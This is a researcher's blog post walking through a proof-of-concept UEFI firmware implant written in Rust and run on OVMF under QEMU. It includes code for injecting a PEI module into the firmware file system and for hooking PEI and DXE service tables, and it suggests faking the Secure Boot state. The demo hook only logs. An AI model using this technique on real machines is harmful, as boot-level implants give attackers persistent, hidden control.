- 2023-02-04
- UEFI APT? UEFI APT!

This is a bit of a rage post because I keep reading articles and reports
overhyping "APT" capabilities writing UEFI persistent malware. The main
takeaway I want readers to get from this post is that **UEFI is not magic;
you can write UEFI malware in an afternoon.** This article will _not_ be
covering how to bypass Secure Boot, Intel Boot Guard or whichever
"le choix du jour" because bypasses for boot security technologies are pretty frequent and firmware is slow to update.

I have written a very simple PoC implant for OVMF called
[PigPEI](https://github.com/birb007/PigPEI). Pig can be used
as a complete reference for listings in this article. If you are not interested
in the sections about FFS or Rust toolchains then scroll until the PEI section.

### Contents

- Building a UEFI module
- Firmware File System injection
- Abusing PEI Initialisation
- Manipulating DXE modules
- Conclusion

## Building a UEFI Module

A UEFI module will belong to a phase of the UEFI boot process: PEI, DXE
(application), DXE (driver), bootloader.  PEI is responsible for initialising
the chipset environment for later UEFI stages (e.g. DRAM init). DXE
applications will configure external hardware devices directly or via ACPI. In
addition, DXE drivers will persist after boot to communicate with the operating
system.

In our example, we will target PEI because most UEFI malware implants infect
other DXE modules with a DXE module or by replacing DXE core (the module
responsible for launching DXE modules) which is boring.

To build a PEIM, you can either use EDK2 or build a module from scratch. EDK2
is an open-source reference implementation of UEFI maintained by Tianocore.
EDK2 can build a standalone module or a complete firmware image (e.g. OVMF)
which bundles all necessary executables. However, we will build a module from
scratch then inject the module into an existing firmware image.

### Rust stuff

The implant will be implemented in Rust because it can. We will restrict
ourselves to no runtime dependencies (including `std`) so everything must be
written from scratch (build dependencies are fine).

The Rust toolchain must be configured to emit a PE32 image with the suitable
properties:
- MSABI
- `EFI_BOOT_SERVICE_DRIVER` [subsystem](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#windows-subsystem)
- No SSE/AVX/MMX and floating point

We can accomplish this with a Cargo build profile:

```json
{
    "llvm-target": "x86_64-unknown-windows",
    "arch": "x86_64",
    "os": "uefi",
    "cpu": "x86-64",

    "data-layout": "e-m:w-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128",
    "target-pointer-width": "64",
    "target-c-int-width": "32",
    "max-atomic-width": "64",
    "features": "-mmx,-sse,+soft-float",

    "is-like-windows": true,
    "executables": true,
    "exe-suffix": ".efi",

    "linker": "rust-lld",
    "linker-flavor": "lld-link",
    "linker-is-gnu": false,
    "lld-flavor": "link",

    "pre-link-args": {
        "lld-link": [
            "/ENTRY:efi_main",
            "/SUBSYSTEM:EFI_BOOT_SERVICE_DRIVER"
        ]
    },
    "abi-return-struct-as-int": true,
    "static-position-independent-executables": true,
    "disable-redzone": true,
    "stack-probes": {
        "kind": "call"
    },
    "emit-debug-gdb-scripts": false
}
```

and `.cargo/config` to remove Rust non-core `std`:

```toml
[build]
target = "x86_64-none-uefi.json"

[unstable]
build-std = ["core", "compiler_builtins"]
build-std-features = ["compiler-builtins-mem"]
```

and `Cargo.toml` section to keep the PEIM small:

```toml
[profile.dev]
panic = "abort"
strip = "symbols"
opt-level = "z"
```

With these configurations, we can build a suitable PE32 image with the right
properties using the standard Rust toolchain.

### Scaffolding

The UEFI Platform Initialisation specification describes all data types
and operating behaviour for PEI. In addition, the UEFI specification describes
all data types and operating behaviour for DXE (and beyond). We must implement
all necessary data types and conform to all involved interfaces.

Important types include:
- `EFI_GUID`
- `EFI_PEI_SERVICES`
- `EFI_SYSTEM_TABLE`
- `EFI_RUNTIME_SERVICES`
- `EFI_BOOT_SERVICES`
- `EFI_HOB_MEMORY_ALLOCATION_MODULE`

The PEIM `EFI_PEIM_ENTR_POINT2` is invoked by the PEI dispatcher at boot:

> **Prototype**
>
> ```c
> typedef
> EFI_STATUS
> (EFIAPI *EFI_PEIM_ENTRY_POINT2) (
>   IN EFI_PEI_FILE_HANDLE        FileHandle
>   IN CONST EFI_PEI_SERVICES     **PeiServices
>   );
> ```
>
> **Parameters**
>
> _FileHandle_: Handle of the file being invoked.
>
> _PeiServices_: Describes the list of possible PEI Services.

The `EFI_PEI_SERVICES` defines a set of services usable by PEIMs (analogous to
`EFI_RUNTIME_SERVICES` and `EFI_BOOT_SERVICES`). We have to define the struct
so we can use the function pointers passed to the entrypoint.

```rs
#[repr(C)]
pub struct PeiServices {
    header: TableHeader,

    // PPI Functions
    pub install_ppi: pei_fn!(*const PpiDescriptor),
    reinstall_ppi: Cptr,
    locate_ppi: Cptr,
    notify_ppi: Cptr,

    // Boot Mode Functions
    pub get_boot_mode: pei_fn!(&mut BootMode),
    set_boot_mode: Cptr,
    ...
}
```

Now we can invoke PEI services. For example, we can get the `EFI_BOOT_MODE` of
the current invocation with the following.

```rs
fn get_boot_mode(svc: &&mut PeiServices) -> BootMode {
    let mut boot_mode = BootMode::FullConfig;
    if (svc.get_boot_mode)(svc, &mut boot_mode) != EfiStatus::Success {
        panic!("call to GetBootMode() failed")
    }
    boot_mode
}
```

The last bit of scaffolding is to get debug output. I chose to implement an
identical interface to the [`log`](https://docs.rs/log/latest/log/) crate,
wrapping UART, but you can use whatever.

## Firmware File System injection

Now that we have a basic PEIM, we want to inject the PEIM into an existing
firmware image. UEFI Firmware Volumes (FVs) are formatted with Firmware File
System (FFS).

> **2.2.2 Firmware File System Format**
>
> The PI Architecture Firmware File System is a binary layout of file storage
> within firmware volumes. It is a flat file system in that there is no
> provision for any directory hierarchy; all files reside in the root
> directly. Files are stored end to end without any directory entry to describe
> which files are present. Parsing the contents of a firmware volume to obtain
> a listing of files present requires walking the firmware volume from
> beginning to end.

FFS files are comprised of a file header and sections. The file header
describes the type, size, and other properties then the sections contain the
data relevant for the parent file type. The sections are laid out contiguously
after the file header (the sections have trailing data). Any remaining space in
the file must be padded. For example, a PEIM will be stored as:

- `EFI_FFS_FILE_HEADER` (`EFI_FV_FILETYPE_PEIM`)
    - `EFI_COMMON_SECTION_HEADER` (`EFI_SECTION_PE32`)
    - _data_
    - `EFI_COMMON_SECTION_HEADER` (`PEI_SECTION_PEI_DEPEX`)
    - _data_
    - `EFI_COMMON_SECTION_HEADER` (`EFI_SECTION_USER_INTERFACE`)
    - _data_

The layout of `EFI_FFS_FILE_HEADER` is listed below (`IntegrityCheck` is a
16-bit checksum).

```c
typedef UINT8 EFI_FV_FILETYPE;

/* FFS File Type */
#define EFI_FV_FILETYPE_RAW         0x01
#define EFI_FV_FILETYPE_PEIM        0x06
#define EFI_FV_FILETYPE_FFS_PAD     0xf0
...
typedef UINT8 EFI_FFS_FILE_ATTRIBUTES;

/* FFS File Attributes */
#define FFS_ATTRIB_LARGE_FILE       0x01
#define FFS_ATTRIB_DATA_ALIGNMENT   0x04
...
typedef UINT8 EFI_FFS_FILE_STATE;

/* FFS File State Bits */
#define EFI_FILE_HEADER_VALID       0x02
#define EFI_FILE_DATA_VALID         0x04
...
typedef struct {
    EFI_GUID                Name;
    EFI_FFS_INTEGRITY_CHECK IntegrityCheck;
    EFI_FV_FILETYPE         Type;
    EFI_FFS_FILE_ATTRIBUTES Attributes;
    UINT8                   Size[3];
    EFI_FFS_FILE_STATE      State;
} EFI_FFS_FILE_HEADER;

/* EFI_FFS_FILE_HEADER2 has an extended Size for large files. */
```

The layout of `EFI_COMMON_SECTION_HEADER` is listed below.

```c
typedef UINT8 EFI_SECTION_TYPE;

/* Encapsulation section Type values */
#define EFI_SECTION_COMPRESSION     0x01
#define EFI_SECTION_GUID_DEFINED    0x02
...
/* Leaf section Type values */
#define EFI_SECTION_PE32            0x10
#define EFI_SECTION_VERSION         0x12
#define EFI_SECTION_USER_INTERFACE  0x15
#define EFI_SECTION_PEI_DEPEX       0x1b
...
typedef struct {
    UINT8               Size[3];
    EFI_SECTION_TYPE    Type;
} EFI_COMMON_SECTION_HEADER;
```

Depending on the `Type` of the section, an additional header will follow the
common header (e.g. `EFI_COMPRESSION_SECTION` which specifies the compression
algorithm).

![UEFITool GUID defined section](assets/uefitool_lzma.webp)

In this screenshot, we see a GUID defined section using LZMA to compress two
subvolumes (containing DXE and PEI modules, respectively).

### Matryoshka Sections

Despite FFS being a flat file system, sections can be of type
`EFI_SECTION_FIRMWARE_VOLUME_IMAGE` which is a complete FV (i.e. FFS image).
Therefore sections can embed multiple files after unpacking. In OVMF we can see
the PEIMs are contained within a FV within a compressed section within a
top-level file.

![UEFITOol parsing FVs for OVMF](assets/uefitool.webp)

### Adding A New File

To include our own PEIM, we must locate the existing PEIMs then append a valid
FFS file to the parent FV. The FFS file must contain sections for:

- PE32
- DEPEX (dependency expression)
- _[optional]_ name
- _[optional]_ version

You will have to build the sections yourself but here is a peek at mine :)

```py
...
# encapsulate PE32 image
# the section size must be aligned for unknown reasons
pe_size = calcsize(FileSectionFmt) + len(module)
payload += make_section(EFI_SECTION_PE32, align8(pe_size))
payload += module
payload += make_padding(pe_size)
pe_size = align8(pe_size)
...
payload = bytearray(pack(FileHeaderFmt,
    str2guid("418b8d4eadc84298bb70ccf0a27405fe"),
    0x0,
    EFI_FV_FILETYPE_PEIM,
    0,
    (file_size >> 0 ) & 0xff,
    (file_size >> 8 ) & 0xff,
    (file_size >> 16) & 0xff,
    0x0
) + payload)

# patch in integrity check for new file
header_checksum = make_checksum(payload[:calcsize(FileHeaderFmt)])
# ignore header checksum with magic value
data_checksum = 0xaa
checksum = pack("<BB", header_checksum, data_checksum)
payload[16:18] = checksum

# patch in file state (must be 0 while computing header checksum)
# the leading reserved bits must be set to the FV erase polarity
state = (EFI_FILE_HEADER_CONSTRUCTION
        | EFI_FILE_HEADER_VALID
        | EFI_FILE_DATA_VALID)

# the bits are flipped depending on erase polarity
if erase_polarity:
    state = ~state & 0xff

payload[23] = pack("B", state & 0xff)[0]
with open("payload.ffs", "wb") as f:
    f.write(payload)
```

After appending the file to the FV, all parent sections and FVs must be updated
to include the size of our file (this is recursive). An additional constraint
is that we must ensure the file alignment is preserved after inserting a new
file so other FVs may need modifying to include padding files. To do this,
you can either write a script to parse FFS yourself or use UEFITool. If you
choose to write your own script, section 2.2 of the PI spec describes routines
for modifying files then verifying FV images. Otherwise, UEFITool can insert
files interactively or update FVs programmatically using `uefireplace`.

```sh
$ uefireplace $FV/OVMF_CODE.fd $(cat uuid) 10 $TARGET 1>/dev/null
```

This replaces the file with the given UUID with the target file (containing an
executable) which is detected by PEI core then dispatched.

### Loading Images

The OVMF image can be directly loaded by QEMU for debugging.

```sh
#!/usr/bin/env sh
set -euo 1>/dev/null

cargo build
[ -f $TARGET ] || exit 1
uefireplace $FV/OVMF_CODE.fd $(cat uuid) 10 $TARGET 1>/dev/null

# Create a UEFI environment with mounted OVMF firmware and
# ISA exit device mapped at 0x501 I/O address.
qemu-system-x86_64 \
    -s -nographic \
    -machine type=q35,accel=kvm:tcg -m 512 \
    -drive file=$FV/OVMF_CODE.fd.patched,format=raw,if=pflash \
    -drive file=$FV/OVMF_VARS.fd,format=raw,if=pflash \
    -device isa-debug-exit \
    -debugcon file:debug.log -global isa-debugcon.iobase=0x402 \
    -monitor none -serial stdio
```

We have enabled the GDB server, serial output, and disabled graphics in a handy
debug script.

## Abusing Pre-EFI Initialisation (PEI)

Now that we have a working setup, we can start breaking UEFI. In UEFI,
DXE core is responsible for launching DXE modules so we want to control DXE core
to manipulate the DXE environment and the operating system. Obviously we can
outright replace DXE core but reimplementing DXE core from scratch is tedious
and modifying EDK2 is cheating.

### Intercepting DXE core

We can control DXE core by hooking a PEI service which it invokes. We will
hook the `EFI_PEI_INSTALL_PPI` service.

> **InstallPpi()**
>
> **Summary**
>
> This service is the first one provided by the PEI Foundation. This function
> installs an interface in the PEI PPI database by GUID. The purpose of the
> service is to publish an interface that other parties can use to call
> additional PEIMs.
>
> **Prototype**
>
> ```c
> typedef
> EFI_STATUS
> (EFIAPI *EFI_PEI_INSTALL_PPI) (
>   IN CONST EFI_PEI_SERVICES           *PeiServices,
>   IN CONST EFI_PEI_PPI_DESCRIPTOR     *PpiList
>   );
> ```
>
> **Parameters**
>
> _PeiServices_: An indirect pointer to the `EFI_PEI_SERVICES` table published
> by the PEI Foundation.
>
> _PpiList_: A pointer to the list of interfaces that the caller shall install.

We can intercept the DXE IPL PPI attempting to install
`EFI_PEI_END_OF_PEI_PHASE`, a PPI used to indicate the end of the PEI phase. It
is an optional PPI so an alternative mechanism is to hook `EFI_DXE_IPL_PPI` to
control the discovery of the DXE Foundation.

```rs
pub unsafe fn hook_dxe_core(svc: &mut PeiServices) -> Result<(), EfiStatus> {
    // DxeCore signals the end of PEI by installing the EFI_DXE_IPL_PPI PPI.
    // By hooking InstallPpi, we can locate DxeCore by waiting for this PPI.
    debug!("hooking InstallPpi in EFI_PEI_SERVICES");
    ORIGINAL_INSTALL_PPI = svc.install_ppi;
    svc.install_ppi = install_ppi_hook;
    Ok(())
}

/// EFI_INSTALL_PPI hook is triggered as a callback after our PEIM exits.
extern "efiapi" fn install_ppi_hook(
    svc: PeiServicesPtr, mut ppi_list: *const PpiDescriptor) -> EfiStatus {
    // DxeCore loader installs EFI_PEI_END_OF_PEI_PPI to signal end of PEI.
    const PPI_DESCRIPTOR_TERMINATE_LIST: usize = 0x80000000;
    const PEI_END_OF_PEI_PPI: Guid = guid!("605ea650-c65c-42e1-ba8091a52ab618c6");

    // Iterate until we can find DxeCore or proxy to original function.
    unsafe { loop {
        let descriptor = &*ppi_list;
        if *descriptor.guid == PEI_END_OF_PEI_PPI {
            info!("trapped DxeLoadCore before DxeCore is called");
            if let Err(status) = find_and_hook_services(svc) {
                panic!("failed to hook EFI_BOOT_SERVICES: {:?}", status);
            }
        }
        // Use the original InstallPpi to properly install the PPI.
        let status = ORIGINAL_INSTALL_PPI(svc, ppi_list);
        if status != EfiStatus::Success {
            warn!("original InstallPpi returned {:?}", status);
            break status;
        }
        // Advance to the next descriptor.
        ppi_list = ppi_list.add(1);
        // The final entry of the PpiList is marked.
        if descriptor.flags & PPI_DESCRIPTOR_TERMINATE_LIST != 0 {
            break EfiStatus::Success;
        }
    }}
}
```

This hook scans the list of PPIs to be installed to find our target GUID. If
the GUID is present then we have interrupted DXE core.

### Hooking Service Tables

Once we have intercepted DXE IPL PPI, we can locate the service tables. The
service tables can be easily found by scanning for the table signatures in
memory. However, we can reduce the search space by (ab)using the HOB list.
The HOB list is a Hand-Off Block list passed by the DXE Initial Program Load
to the DXE Foundation. The HOB list describes the environment, informing the
DXE Foundation on how to behave properly (e.g. preventing allocations in
stolen memory).

The HOB List must contain the Phase Handoff Information Table (PHIT) HOB. The
PHIT HOB describes a region of tested memory (i.e. stable and reliable memory)
which the DXE Foundation can use to read the HOB List. The PHIT is laid out as
follows.

> ```c
> typedef struct _EFI_HOB_HANDOFF_INFO_TABLE {
>     EFI_HOB_GENERIC_HEADER  Header;
>     UINT32                  Version;
>     EFI_BOOT_MODE           BootMode;
>     EFI_PHYSICAL_ADDRESS    EfiMemoryTop;
>     EFI_PHYSICAL_ADDRESS    EfiMemoryBottom;
>     EFI_PHYSICAL_ADDRESS    EfiFreeMemoryTop;
>     EFI_PHYSICAL_ADDRESS    EfiFreeMemoryBottom;
>     EFI_PHYSICAL_ADDRESS    EfiEndOfHobList;
> } EFI_HOB_HANDOFF_INFO_TABLE;
> ```

With the remaining HOBs directly following.

The HOB list will include an `EFI_HOB_MEMORY_ALLOCATION` HOB which describes all
memory ranges outside the HOB list (i.e. memory which DXE Foundation can
allocate). Therefore, if we can find the region of memory usable by the DXE
Foundation then we can infer where the service tables reside.

```rs
unsafe fn find_dxe_core_hob(
    svc: &&mut PeiServices) -> EfiResult<*const MemoryAllocationModule> {
    // Retrieve the final HOB list for all PEIMs.
    let mut hob_list: *const HobGenericHeader = core::ptr::null();
    let status = (svc.get_hob_list)(svc, &mut hob_list);
    if status != EfiStatus::Success {
        error!("unable to call GetHobList service: {:?}", status);
        return Err(status);
    }

    const EFI_HOB_MEMORY_ALLOCATION_HOB: u16 = 0x0002;
    const HOB_MEMORY_ALLOC_MODULE_GUID: Guid = guid!("f8e21975-0899-4f58-a4be5525a9c6d77a");
    // MkePkg DxeCore GUID
    const DXE_CORE_GUID: Guid = guid!("d6a2cb7f-6a18-4e2f-b43b9920a733700a");

    // Iterate over the HOBs until we find the corresponding DxeCore HOB.
    debug!("searching for {} HOB", DXE_CORE_GUID);

    // The first HOB is the PHIT which contains the PA of the last HOB.
    let phit = hob_list.cast::<HobHandoffInfoTable>().as_ref().unwrap();
    hob_list = hob_list.byte_add(phit.header.hob_length.into());

    // Iterate over the remaining HOBs until we find our target (or list ends).
    while hob_list != phit.end_of_hob_list {
        if (*hob_list).hob_type == EFI_HOB_MEMORY_ALLOCATION_HOB {
            let alloc_hob = hob_list.cast::<MemoryAllocationModule>();
            // The allocation HOBs are distinguished by a GUID in a header.
            if (*alloc_hob).alloc_header.name == HOB_MEMORY_ALLOC_MODULE_GUID {
                if (*alloc_hob).module_name == DXE_CORE_GUID {
                    info!("found DxeCore HOB at {:p}", hob_list);
                    return Ok(alloc_hob);
                }
            }
        }
        // Advance to next HOB in the list.
        hob_list = hob_list.byte_add((*hob_list).hob_length.into());
    }
    Err(EfiStatus::NotFound)
}
```

We are cheating in this case since we are looking for memory allocation HOB
belonging to the MdePkg DxeCore but a generic implant can scan all regions or
intelligently figure out the GUID of the suspended DXE Foundation. Once we have
the memory region containing the service tables, we can scan for the table
signatures.

```rs
unsafe fn locate_table<T>(mut addr: *const u64, hi: *const u64, sig: u64
                          ) -> EfiResult<&'static mut T> {
    while addr < hi {
        if *addr == sig {
            return Ok(&mut *addr.cast::<T>().cast_mut());
        }
        addr = addr.add(1);
    }
    Err(EfiStatus::NotFound)
}

unsafe fn find_services(lo: *const u64, hi: *const u64)
        -> EfiResult<(&'static mut SystemTable,
                      &'static mut BootServices,
                      &'static mut RuntimeServices)> {
    // The service tables include a signature which we can search for.
    // The signatures will be aligned because of struct allocation.
    const EFI_BOOT_SERVICES_SIGNATURE: u64 = 0x56524553544f4f42;
    const EFI_RUNTIME_SERVICES_SIGNATURE: u64 = 0x56524553544e5552;
    const EFI_SYSTEM_TABLE_SIGNATURE: u64 = 0x5453595320494249;

    // Scan the HOB for the table signatures.
    debug!("scanning address range {:p}-{:p}", lo, hi);

    // EFI_SYSTEM_TABLE has its signature lying around for whatever reason
    // so we have to validate the matching object.
    let st = locate_table::<SystemTable>(lo, hi, EFI_SYSTEM_TABLE_SIGNATURE)?;
    let system_table = if st.runtime_services as u64 > 0xffffffff  {
        let above_st = (st as *const _ as *const u64).add(1);
        locate_table::<SystemTable>(above_st, hi, EFI_SYSTEM_TABLE_SIGNATURE)?
    } else {
        st
    };
    info!("found EFI_SYSTEM_TABLE at {:p}", system_table);

    let boot_services = locate_table::<BootServices>(
        lo, hi, EFI_BOOT_SERVICES_SIGNATURE)?;
    info!("found EFI_BOOT_SERVICES at {:p}", boot_services);

    let runtime_services = locate_table::<RuntimeServices>(
        lo, hi, EFI_RUNTIME_SERVICES_SIGNATURE)?;
    info!("found EFI_RUNTIME_SERVICES at {:p}", runtime_services);

    Ok((system_table, boot_services, runtime_services))
}

unsafe fn find_and_hook_services(svc: PeiServicesPtr) -> EfiResult<()> {
    // DxeCore is mapped into the same address space so we can scan the HOBs
    // directly to find the boot, runtime, and system tables.

    // The DXE core has an associated EFI_HOB_MEMORY_ALLOCATION_MODULE HOB
    // which describes the loaded PE32's memory range.
    let hob = &*find_dxe_core_hob(svc)?;
    let lo = hob.alloc_header.memory_base_address as *const u64;
    let hi = lo.byte_add(hob.alloc_header.memory_length as usize);

    // Attempt to locate the tables within the HOB range.
    let (st, bs, rt) = find_services(lo, hi)?;

    debug!("verifying table contents are as expected");
    // gRT is initially filled out with placeholder functions.
    debug!("gRT->GetTime       = {:p}", rt.get_time);
    debug!("gRT->SetTime       = {:p}", rt.set_time);
    debug!("gRT->SetWakeupTime = {:p}", rt.set_wakeup_time);
    assert!(rt.get_time == rt.set_wakeup_time && rt.get_time != rt.set_time);
    info!("table contents have been successfully validated");

    // Install the malicious hooks into the tables.
    hooks::install_dxe_hooks(st, bs, rt)
}
```

We have hooked the service tables used by DxeMain. However, there is a
problem, DxeMain copies these tables into a runtime memory pool which are
later overwritten by DXE modules so any hooks in the PHIT tables will be
ignored or overwritten.

However, there is a final hurdle. These are **not** the tables used by DXE
modules invoked by DxeMain because DxeMain copies these tables into a
runtime memory pool which are overwritten by DXE modules.
This pool is not described by the PHIT so we have to hunt for the tables in
memory _after_ they have been copied to the runtime pool. We could modify
these tables before they are copied but because the tables are overwritten,
our hooks would be removed.

## Manipulating DXE Modules

We need to trap into the DXE Foundation after the tables have been copied but
before a DXE module is dispatched. We can do this by carefully crafting hooks
into the original tables which are used by the DXE Foundation as it
initialises the DXE environment. Our steps for interception will be:

1. hook `RegisterProtocolNotify` to detect DXE Foundation reading FVs
2. hunt for `EFI_RUNTIME_SERVICES`, `EFI_SYSTEM_TABLE`, and `EFI_BOOT_SERVICES`
3. overwrite tables with our hooks
4. profit

### Hooking `RegisterProtocolNotify`

UEFI protocols are not always available so if a function needs a particular
protocol to execute, it can register a callback to trigger when the protocol
becomes available (e.g., wait for a device to become available). The function
used by functions to wait for protocols is `RegisterProtocolNotify`.

> **RegisterProtocolNotify()**
>
> **Summary**
>
> Creates an event that is to be signaled whenever an interface is installed for
> a specific protocol.
>
> **Prototype**
>
> ```c
> typedef
> EFI_STATUS
> (EFIAPI *EFI_REGISTER_PROTOCOL_NOTIFY) (
>     IN EFI_GUID     *Protocol,
>     IN EFI_EVENT    Event,
>     OUT VOID        **Registration
> );
> ```

MdePkg DxeCore calls `RegisterProtocolNotify` to determine when it can read the
FV so it can dispatch DXE modules. By cheating, we know that MdePkg DxeCore
will install the firmware volume protocol afer the runtime services and
system table have been allocated in runtime pools.

```rs
extern "efiapi" fn reg_proto_notify_hook(
        guid: *const Guid, event: Cptr, reg: Cptr) -> EfiStatus {
    const FIRMWARE_VOLUME_2_PROTOCOL_GUID: Guid
        = guid!("220e73b6-6bdb-4413-8405b974b108619a");

    if unsafe { *guid } == FIRMWARE_VOLUME_2_PROTOCOL_GUID {
        info!("intercepted DxeMain after initialisation");
        if locate_and_hook_tables() != EfiStatus::Success {
            error!("cannot install hooks, failing silently");
        }
        info!("removing gBS->RegisterProtocolNotify hook");
        unsafe {
            BS.assume_init_mut().register_protocol_notify =
                ORIG_REG_PROTO_NOTIFY
        };
    }
    unsafe { ORIG_REG_PROTO_NOTIFY(guid, event, reg) }
}
```

Now we have interrupted DXE Foundation after the tables have been relocated
and before any other DXE Modules are launched. We can start looking for the
tables.

### Hunting for Tables

EDK-2 maintains a pool of available pages which are allocated on demand. We
can search for these pages by walking the page-table. We use some criteria
to reduce false-positives and speed up the search by only considering
present pages and ignoring all pages above 4GB. Once we have found table
signatures, we try to validate the contents.

- For `EFI_RUNTIME_SERVICES`, we check whether `GetTime` and
`GetNextHighMonotonicCount` are above 1MB because our allocation can never
be in the legacy address range (this could be further improved to have an
upper-limit of TSEG).

- For `EFI_SYSTEM_TABLE`, we check that `gST->RuntimeServices` and
`gST->BootServices` are also above 1MB.

A final check validates that the tables are properly linked by checking that
the system table has a pointer to the runtime services table. If the
candidates pass these checks then we have found our tables which we can hook.

### Final Hooks

The hooks are straightforward to implement by overwriting table entries. The
reference implementation hooks `ExitBootServices` but a more interesting
target is `GetVariable` so we can lie about the presence of Secure Boot.

```c
fn locate_and_hook_tables() -> EfiStatus {
    if let Some((st, rt)) = unsafe { hunt_for_tables() } {
        info!("found referential pair of UEFI tables, all tables found");
        debug!("gST                  = {:p}", st);
        debug!("gST->RuntimeServices = {:p}", st.runtime_services);
        debug!("gST->BootServices    = {:p}", st.boot_services);
        unsafe {
            let bs = st.boot_services.as_mut().unwrap();
            info!("installing gBS->ExitBootServices hook");
            ORIG_EXIT_BOOT_SERVICES = bs.exit_boot_services;
            bs.exit_boot_services = exit_boot_services_hook;
            BS.write(bs); // permanent, this will not be relocated.
            RT.write(rt); // permanent, this will not be relocated.
            ST.write(st); // permanent, this will not be relocated.
        }
        EfiStatus::Success
    } else {
        EfiStatus::NotFound
    }
}

extern "efiapi" fn exit_boot_services_hook(img: Cptr, key: usize) -> EfiStatus {
    info!("DXE image has initiated ExitBootServices()");
    unsafe { ORIG_EXIT_BOOT_SERVICES(img, key) }
}
```

With the hooks, you can control DXE and the OS as you please.

## Conclusion

We pwn3d UEFI!!!111!

```
[OK] loaded PigPEI
[??] hooking InstallPpi in EFI_PEI_SERVICES
[OK] trapped DxeLoadCore before DxeCore is called
[??] searching for d6a2cb7f-6a18-4e2f-b43b-9920a733700a HOB
[OK] found DxeCore HOB at 0x1bf58d48
[??] scanning address range 0x1fe89000-0x1feb7000
[OK] found EFI_SYSTEM_TABLE at 0x1feaee00
[OK] found EFI_BOOT_SERVICES at 0x1feae820
[OK] found EFI_RUNTIME_SERVICES at 0x1feadd80
[??] verifying table contents are as expected
[??] gRT->GetTime       = 0x1fe98c72
[??] gRT->SetTime       = 0x1fe98c67
[??] gRT->SetWakeupTime = 0x1fe98c72
[OK] table contents have been successfully validated
[OK] hooking gBS->RegisterProtocolNotify
[OK] intercepted DxeMain after initialisation
[??] searching pages for table signatures
[??] cr3 = 1fc01000
[??] PML4 = 0x1fc01000
[OK] found EFI_SYSTEM_TABLE at 0x1f9ee018
[OK] found EFI_RUNTIME_SERVICES at 0x1f9eeb98
[OK] found referential pair of UEFI tables, all tables found
[??] gST                  = 0x1f9ee018
[??] gST->RuntimeServices = 0x1f9eeb98
[??] gST->BootServices    = 0x1feae820
[OK] installing gBS->ExitBootServices hook
[OK] removing gBS->RegisterProtocolNotify hook
```

## References

- [UEFI Platform Initialization Specification Version 1.8](https://uefi.org/specifications)
- [UEFI Specification Version 2.9](https://uefi.org/specifications)
- [EDK2 repository](https://github.com/tianocore/edk2)
- [Intel SDM Vol 3A](https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html)


